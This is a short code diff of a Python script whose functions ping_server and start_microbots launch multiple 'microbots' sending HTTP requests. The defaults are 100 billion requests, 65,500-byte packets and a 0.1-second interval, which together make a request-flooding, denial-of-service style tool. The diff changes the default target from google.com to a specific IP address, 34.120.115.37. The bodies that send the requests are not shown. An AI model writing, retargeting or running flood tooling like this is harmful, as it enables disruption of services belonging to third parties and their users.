@@ -6,7 +6,7 @@ def ping_server(host, count=100000000000, packet_size=65500, bot_id=1):
     """
     Simulates a ping using HTTP requests to check if the server is reachable, with adjustable packet size.
     Args:
-        host (str): The server or domain to ping (e.g., "http://google.com").
+        host (str): The server or domain to ping (e.g., "34.120.115.37").
         count (int): Number of requests to send (default is 100000000000).
         packet_size (int): Size of the packet to simulate (in bytes).
         bot_id (int): The ID for this microbot.
@@ -34,7 +34,7 @@ def ping_server(host, count=100000000000, packet_size=65500, bot_id=1):
     except requests.exceptions.RequestException as e:
         print(f"Bot-{bot_id}: An error occurred: {e}")
 
-def start_microbots(num_bots, host="http://google.com", ping_interval=0.1, packet_size= 65500):
+def start_microbots(num_bots, host="34.120.115.37", ping_interval=0.1, packet_size= 65500):
     """
     Starts the specified number of microbots, each pinging the server.
     Args:
